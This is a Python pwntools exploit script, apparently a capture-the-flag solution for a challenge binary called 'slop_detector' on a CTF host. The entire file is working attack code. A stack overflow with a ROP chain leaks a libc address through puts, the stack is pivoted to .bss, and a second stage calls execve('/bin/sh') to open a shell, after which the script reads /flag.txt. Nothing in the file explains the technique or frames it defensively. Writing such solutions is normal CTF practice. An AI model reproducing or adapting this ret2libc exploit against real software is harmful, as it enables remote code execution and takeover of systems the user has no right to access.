#!/usr/bin/env python3
from pwn import *


HOST = "instancer.dalctf2026.com"
PORT = 27071

context.binary = elf = ELF("./slop_detector", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

POP_RDI = 0x401311
POP_RBP = 0x40121D
READ_STAGE2 = 0x4012F0
BSS_RBP = 0x404400
ARGV = 0x4044D0


def start():
    if args.LOCAL:
        return process(["./ld-linux-x86-64.so.2", "--library-path", ".", "./slop_detector"])
    return remote(HOST, PORT)


def build_stage2():
    rop = ROP(libc)
    pop_rsi = rop.find_gadget(["pop rsi", "ret"]).address
    pop_rdx_rbx = libc.address + 0x904A9
    ret = rop.find_gadget(["ret"]).address
    binsh = next(libc.search(b"/bin/sh\x00"))
    execve = libc.symbols["execve"]

    return fit(
        {
            0x40: flat(
                BSS_RBP,
                ret,
                POP_RDI,
                binsh,
                pop_rsi,
                ARGV,
                pop_rdx_rbx,
                0,
                0,
                execve,
            ),
            0x100: flat(binsh, 0),
        },
        filler=b"Y",
    )


def main():
    io = start()

    io.recvuntil(b"sentence: ")
    io.send(flat(b"A" * 72, POP_RDI, elf.got["puts"], elf.plt["puts"], elf.symbols["main"]))

    puts_leak = u64(io.recvline().strip().ljust(8, b"\x00"))
    libc.address = puts_leak - libc.symbols["puts"]
    log.info(f"puts leak = {hex(puts_leak)}")
    log.info(f"libc base = {hex(libc.address)}")

    io.recvuntil(b"sentence: ")
    io.send(flat(b"B" * 72, POP_RBP, BSS_RBP, READ_STAGE2))
    sleep(0.2)
    io.send(build_stage2())
    sleep(0.3)

    io.sendline(b"cat /flag.txt")
    data = io.recvrepeat(2)
    print(data.decode("latin-1", errors="ignore").strip())


if __name__ == "__main__":
    main()
